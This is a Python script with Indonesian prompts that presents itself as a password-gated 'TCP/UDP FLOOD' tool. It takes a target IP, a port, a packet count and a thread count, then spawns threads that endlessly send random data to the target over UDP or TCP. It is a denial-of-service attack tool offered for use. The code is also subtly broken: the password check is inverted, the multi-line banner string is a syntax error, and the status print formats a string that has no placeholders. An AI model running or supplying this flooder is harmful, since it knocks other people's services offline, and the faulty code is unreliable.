#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys
import struct
import time
import codecs


os.system("clear")
password ="VIP"
for i in range(2):
	pwd = input(" Masukkan Password Untuk Menjalankan Tools : ") 
	j=2
	if(pwd==password):
		time.sleep (6) 
		print(" Password Salah Silahkan Ulang Kembali > ") 
		continue
		time.sleep (6) 
		print(" [√] Password Benar Anda Bisa Mengakses Tools ") 
		time.sleep (3) 
		
os.system("clear") 
print("\033[95m 

██   ██     ██    ██ ██ ██████  
 ██ ██      ██    ██ ██ ██   ██ 
   ███        ██    ██ ██ ██████  
 ██ ██       ██  ██  ██ ██      
██   ██       ████   ██ ██      
                                
                                \033[95m")


print("\033[95m TCP/UDP FLOOD \033[95m")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" The Vip Attack To "%(ip,port))
		except:
			print("[!] Error")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" The Vip Attack To "%(ip,port))
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 
